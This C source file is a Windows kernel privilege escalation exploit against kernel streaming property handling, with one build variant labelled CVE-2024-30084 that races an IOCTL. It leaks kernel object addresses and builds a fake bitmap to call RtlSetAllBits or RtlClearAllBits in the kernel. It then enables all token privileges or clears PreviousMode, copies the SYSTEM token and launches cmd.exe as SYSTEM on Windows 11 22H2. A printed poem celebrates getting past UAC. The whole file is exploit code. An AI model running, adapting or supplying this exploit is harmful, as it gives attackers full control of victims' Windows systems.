#define __STREAMS__
#define _INC_MMREG
#define _PREVIOUS_MODE            0xbaba
#define cve202430084           0xcafe
#include "helpers.h"

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdllp.lib")
#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "Advapi32.lib")

int main() {
    HANDLE hDevice = NULL;
    BOOL res = FALSE;
    uint32_t Ret = 0;

#ifdef cve202430084
    hDevice = GetKsDevice(KSNAME_Server);
#else
    hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);
#endif

#ifdef _SEP_TOKEN_PRIVILEGES
    HANDLE hToken;
    uint64_t ktoken_obj = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) ||
        GetObjPtr(&ktoken_obj, GetCurrentProcessId(), hToken) != NULL) {
        return -1;
    }
#elif defined _PREVIOUS_MODE
    uint64_t Sysproc = 0, Curproc = 0, Curthread = 0;
    HANDLE hCurproc = 0, hThread = 0;
    if ((Ret = GetObjPtr(&Sysproc, 4, (HANDLE)4)) != NULL) return Ret;

    hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    if (hThread && (Ret = GetObjPtr(&Curthread, GetCurrentProcessId(), hThread)) != NULL) return Ret;

    hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    if (hCurproc && (Ret = GetObjPtr(&Curproc, GetCurrentProcessId(), hCurproc)) != NULL) return Ret;
#endif

#ifdef cve202430084
    pInBufProperty->Set = pSerialHdr->PropertySet = KSPROPSETID_Service;
#else
    pInBufProperty->Set = pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
#endif
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;
    pSerialHdr->Count = 0x1;

    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set   = pInBufProperty->Set;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id    = 0x45;

    UINT_PTR ntoskrnlBase = GetKernelModuleAddress("ntoskrnl.exe");
    pOutBufPropertyData->FakeBitmap = (PRTL_BITMAP)AllocateBitmap(sizeof(RTL_BITMAP), Ptr64(0x10000000));
    if (!pOutBufPropertyData->FakeBitmap) return -1;

#ifdef _SEP_TOKEN_PRIVILEGES
    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20 * 4;
    pOutBufPropertyData->FakeBitmap->Buffer     = Ptr64(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);
    pInBufPropertyData->ptr_ArbitraryFunCall     = Ptr64(leak_gadget_address("RtlSetAllBits"));
#elif defined _PREVIOUS_MODE
    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20;
    pOutBufPropertyData->FakeBitmap->Buffer     = Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621);
    pInBufPropertyData->ptr_ArbitraryFunCall     = Ptr64(leak_gadget_address("RtlClearAllBits"));
#endif

    printf("\n\nUAC says \"You shall not pass!\"\n");
    printf("But I've got tricks with system class,\n");
    printf("A token here, a handle there,\n");
    printf("Now SYSTEM access I declare.\n");
    printf("Debugger's hooked, the kernel's near,\n");
    printf("My exploit's path is crystal clear,\n");
    printf("From user mode to kernel space,\n");
    printf("I dance through Windows with such grace!\n\n\n\n");

#ifdef cve202430084
    HANDLE hRaceThread = CreateThread(NULL, 0, ModifySetValue, NULL, 0, NULL);
    if (!hRaceThread) return FALSE;
    SetThreadPriority(hRaceThread, THREAD_PRIORITY_TIME_CRITICAL);
    for (int i = 0; i < 10000; ++i) SendIoctlReq(hDevice);
#else
    SendIoctlReq(hDevice);
#endif

#ifdef _SEP_TOKEN_PRIVILEGES
    HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPidByName(L"winlogon.exe"));
    if (!hWinLogon) return FALSE;
    CreateProcessFromHandle(hWinLogon, (LPSTR)"cmd.exe");
    return TRUE;
#elif defined _PREVIOUS_MODE
    KPROCESSOR_MODE mode = UserMode; 
    Write64(Ptr64(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), Ptr64(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);
    Write64(Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621), &mode, sizeof(mode));
    system("cmd.exe");
#endif

    return 0;
}
